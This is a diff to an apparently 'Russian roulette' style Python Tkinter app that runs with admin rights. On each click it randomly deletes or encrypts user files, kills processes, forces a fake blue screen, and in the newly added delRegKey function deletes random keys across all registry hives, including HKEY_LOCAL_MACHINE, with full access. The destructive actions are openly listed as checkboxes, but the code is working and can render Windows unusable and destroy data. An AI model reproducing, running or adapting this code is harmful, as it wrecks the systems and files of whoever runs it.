@@ -1,4 +1,5 @@
 import os
+import winreg as reg
 from ctypes import windll
 from string import printable
 from glob import glob
@@ -152,6 +153,43 @@ if windll.shell32.IsUserAnAdmin():
                 
             except: path = rndFile(folder=True)
                 
+    def delRegKey():
+        
+        def RandomKeyChose(base_key: reg.HKEYType, hkey: int):
+        
+            global key_name
+            
+            try: 
+                rd_key_index = randint(0, reg.QueryInfoKey(base_key)[0]) 
+                rd_key = reg.EnumKey(base_key, rd_key_index)
+                key_name = key_name + rd_key + '\\'
+                base_key = reg.OpenKey(hkey, key_name, 0, reg.KEY_ALL_ACCESS)
+                RandomKeyChose(base_key, hkey)
+                
+            except: 
+                key_info = reg.EnumValue(base_key, rd_key_index)
+                reg.DeleteKeyEx(base_key, key_info[0])
+
+        global key_name
+    
+        key_name = str()
+        hkey_list = [reg.HKEY_CLASSES_ROOT, reg.HKEY_CURRENT_CONFIG, reg.HKEY_CURRENT_USER, reg.HKEY_DYN_DATA, reg.HKEY_LOCAL_MACHINE, reg.HKEY_PERFORMANCE_DATA, reg.HKEY_USERS]
+
+        while True:
+
+            hkey = choice(hkey_list)
+            
+            try:
+                base_key = reg.OpenKey(hkey, r'', 0, reg.KEY_ALL_ACCESS)
+                RandomKeyChose(base_key, hkey)
+                return "Register located at %s deleted !" % (key_name)
+                                
+            except:
+                key_name = str()
+                continue
+                
+        
+                
     def Bsod():
         os.system("taskkill /f /im explorer.exe")
         hotkey("win", "d")
@@ -182,7 +220,7 @@ if windll.shell32.IsUserAnAdmin():
         
         settings["save_settings"][k] = save_settings[k].get()
             
-        with open("scripts/settings.json", "w") as j: dump(settings, j, indent=4)
+        with open("settings.json", "w") as j: dump(settings, j, indent=4)
            
     def ClosePopup():
         
@@ -190,17 +228,26 @@ if windll.shell32.IsUserAnAdmin():
         
         settings["first_start"] = False
         
-        with open("scripts/settings.json", "w") as f: dump(settings, f, indent=4)
+        with open("settings.json", "w") as f: dump(settings, f, indent=4)
         
         link.destroy()
         LoadApp()
+        
+    def OpenLogs():
+        try:
+            os.startfile(r"events.log")
+        except:
+            with open('events.log', 'a+', encoding='utf-8') as logs:
+                os.startfile(r"events.log")
             
     def LoadApp():
         
         global menu
         
         main_canvas.delete("all")
-        main_canvas.create_window(mcw/2, 375, window=gun_button)
+        main_canvas.create_window(mcw/2, mch/1.92, window=gun_button)
+        main_canvas.create_window(mcw/7.2, mch/1.107692307692308, window=open_logs_button)
+        
         menu.destroy()
         menu = Menu(window, tearoff=0)
         window.config(menu=menu)
@@ -214,13 +261,14 @@ if windll.shell32.IsUserAnAdmin():
         main_canvas.create_window(mcw/1.0945273631840796019900497512438, mch/6.8571428571428571428571428571429, window=quit_button)
         main_canvas.create_window(mcw/2, 125, window=settings_title)
         main_canvas.create_window(mcw/10.891089108910891089108910891089, mch/2.88, window=sound_c)
-        main_canvas.create_window(mcw/10.47619047619047619047619047619, mch/2.4, window=deleting_c)
-        main_canvas.create_window(mcw/10, mch/2.0571428571428571428571428571429, window=encrypting_c)
-        main_canvas.create_window(mcw/10.78431372549019607843137254902, mch/1.8, window=starting_c)
-        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.6, window=creating_c)
-        main_canvas.create_window(mcw/11, mch/1.44, window=taskkill_c)
-        main_canvas.create_window(mcw/11.578947368421052631578947368421, mch/1.3090909090909090909090909090909, window=bsod_c)
-        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.2, window=nothing_c)
+        main_canvas.create_window(mcw/10.47619047619047619047619047619, mch/2.440677966101695, window=deleting_c)
+        main_canvas.create_window(mcw/10, mch/2.117647058823529, window=encrypting_c)
+        main_canvas.create_window(mcw/10.78431372549019607843137254902, mch/1.846153846153846, window=starting_c)
+        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.655172413793103, window=creating_c)
+        main_canvas.create_window(mcw/11, mch/1.5, window=taskkill_c)
+        main_canvas.create_window(mcw/11.578947368421052631578947368421, mch/1.371428571428571, window=bsod_c)
+        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.263157894736842, window=nothing_c)
+        main_canvas.create_window(mcw/8.75, mch/1.170731707317073, window=register_deleting_c)
 
     def onClick():
         
@@ -228,37 +276,41 @@ if windll.shell32.IsUserAnAdmin():
         
         while True:
         
-            rda = round(random(), 2)
+            rda = randint(0, 100)
             
-            if not 0.01 < rda <= 0.2 and save_settings["Sounds"].get():
+            if not 1 < rda <= 10 and save_settings["Sounds"].get():
                 gun_button.configure(image=gunshot)
                 shot_audio.play()
                 window.after(100, lambda: gun_button.configure(image=gun))
             
-            if 0 <= rda <= 0.01 and save_settings["Bsod"].get(): Bsod()
-            elif 0.01 < rda <= 0.2 and save_settings["Nothing"].get():
+            if 0 < rda <= 1 and save_settings["Bsod"].get(): Bsod()
+            elif 1 < rda <= 10 and save_settings["Nothing"].get():
                 text_action = "You haven't had anything ... So far!"
                 color = "#cfcfb8"
                 break
-            elif 0.2 < rda <= 0.4 and save_settings["Deleting"].get():
+            elif 10 < rda <= 25 and save_settings["Deleting"].get():
                 text_action = delAll(rndFile(folder=True, file=True))
                 color = "#E20808"
                 break
-            elif 0.4 < rda <= 0.5 and save_settings["Encrypting"].get():
+            elif 25 < rda <= 35 and save_settings["Encrypting"].get():
                 text_action = cptFile(rndFile(file=True))
                 color = "#E208B4"
                 break
-            elif 0.5 < rda <= 0.7 and save_settings["Starting"].get():
+            elif 35 < rda <= 55 and save_settings["Starting"].get():
                 text_action = strFile(rndFile(file=True))
                 color = "#42BF20"
                 break
-            elif 0.7 < rda <= 0.8 and save_settings["Creating"].get():
+            elif 55 < rda <= 65 and save_settings["Creating"].get():
                 text_action = addFile(rndFile(folder=True))
                 color = "#0843E2"
                 break
-            elif 0.8 < rda <= 1 and save_settings["Taskkill"].get():
+            elif 65 < rda <= 85 and save_settings["Taskkill"].get():
                 text_action = kilProcess()
                 color = "#DA5914"
+                break
+            elif 85 < rda <= 100 and save_settings["Register-Deleting"].get():
+                text_action = delRegKey()
+                color = "#1DF7AF"
                 break
             else:
                 c = True
@@ -281,7 +333,7 @@ if windll.shell32.IsUserAnAdmin():
     window.maxsize(ww, wh)
     window.minsize(ww, wh)
     
-    with open("scripts/settings.json", "r") as j: 
+    with open("settings.json", "r") as j: 
         settings = load(j)
     save_settings = dict(settings["save_settings"])
     first_start = bool(settings["first_start"])
@@ -305,6 +357,7 @@ if windll.shell32.IsUserAnAdmin():
     gun = PhotoImage(file="assets/gun.png")
     gunshot = PhotoImage(file="assets/gunshot.png")
     gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0, cursor="hand2")
+    open_logs_button = Button(window, cursor="hand2", relief=FLAT, bg="#24B7C1", border=0, height=round(mch/144), width=round(mcw/36.666666666666666666666666666667), fg="#262828", text="Open Events Log", font=("Cascadia Mono", round(ww*wh/108000)), activeforeground="#BCC9CA", activebackground="#1ACCD8", command=OpenLogs)
 
     link = Label(window, text="Github", fg="blue", bg="#697783", cursor="hand2", font=("Cascadia Code SemiLight", round(ww*wh/72000)))
     title = Label(window, text="Hey you ! Thank you for downloading this app !", fg="#283747", font=("Carlito", round(ww*wh/36000), "underline"), bg="#697783")
@@ -322,6 +375,7 @@ if windll.shell32.IsUserAnAdmin():
     taskkill_c = Checkbutton(window, cursor="hand2", text="Taskkill", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Taskkill"], command=lambda: SettingsSaveWrite("Taskkill"))
     bsod_c = Checkbutton(window, cursor="hand2", text="Bsod", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Bsod"], command=lambda: SettingsSaveWrite("Bsod"))
     nothing_c = Checkbutton(window, cursor="hand2", text="Nothing", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Nothing"], command=lambda: SettingsSaveWrite("Nothing"))
+    register_deleting_c = Checkbutton(window, cursor="hand2", text = "Register Deleting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Register-Deleting"], command=lambda: SettingsSaveWrite("Register-Deleting"))
 
 
     h = 0
@@ -352,6 +406,10 @@ if windll.shell32.IsUserAnAdmin():
         try:
         
             if text_action is not None:
+                
+                with open('events.log', 'a+', encoding='utf-8') as events_log:
+                    events_log.write('%s\n' % (text_action))
+                
                 h += le
                 if h >= mch:
                     list_canvas.delete("all")
